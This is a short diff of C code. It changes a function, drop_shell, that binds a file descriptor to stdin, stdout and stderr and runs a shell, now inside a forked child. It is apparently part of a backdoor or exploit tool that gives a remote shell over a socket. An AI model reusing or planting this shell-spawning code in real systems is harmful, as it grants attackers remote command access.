@@ -65,11 +65,14 @@ void drop_shell(int fd)
     char *argv[] = {SHELL_PATH, "--norc", NULL};
     char *envp[] = {NULL};
 
-    dup2(fd, 0);
-    dup2(fd, 1);
-    dup2(fd, 2);
-
-    execve(argv[0], argv, envp);
+    if(fork() == 0)
+    {
+        dup2(fd, 0);
+        dup2(fd, 1);
+        dup2(fd, 2);
+    
+        execve(argv[0], argv, envp);
+    }
 }
 
 int watchdog(char *func)
